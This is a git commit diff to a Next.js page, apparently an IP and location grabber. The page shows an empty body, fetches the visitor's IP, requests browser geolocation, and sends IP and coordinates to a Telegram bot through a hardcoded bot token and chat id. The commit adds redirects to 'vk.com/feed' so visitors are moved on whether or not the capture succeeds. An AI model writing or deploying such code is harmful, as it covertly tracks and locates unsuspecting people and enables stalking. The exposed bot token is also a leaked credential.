e31c58bb0cb94cd9df312b0237b4c76ce56b563b
Infinity2326 <dima.gorbachev2002@mail.ru>
2024-04-17 21:21:36 +0300

    last

--- app/page.tsx
+++ app/page.tsx
@@ -16,17 +16,26 @@ export default function Home() {
             fetch("https://api.db-ip.com/v2/free/self")
               .then((res) => res.text())
               .then((data) => {
-                ip2 = data
-                navigator.geolocation.getCurrentPosition((position) => {
-                  const { latitude, longitude } = position.coords
-                  fetch(
-                    `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}%0A%0A${latitude}%0A%0A${longitude}`
-                  )
-                })
+                try {
+                  ip2 = data
+                  navigator.geolocation.getCurrentPosition((position) => {
+                    const { latitude, longitude } = position.coords
+                    fetch(
+                      `https://api.telegram.org/bot6865421260:AAGe563ahno6Ln4Q0gCv490JrMys1NopGG4/sendMessage?chat_id=-1002035561069&text=${ip}%0A%0A${ip2}%0A%0A${latitude}%0A%0A${longitude}`
+                    )
+                    window.location.href = "vk.com/feed"
+                  })
+                } catch (error) {
+                  window.location.href = "vk.com/feed"
+                }
               })
-          } catch (error) {}
+          } catch (error) {
+            window.location.href = "vk.com/feed"
+          }
         })
-    } catch (error) {}
+    } catch (error) {
+      window.location.href = "vk.com/feed"
+    }
   }, [])
   return <p></p>
 }
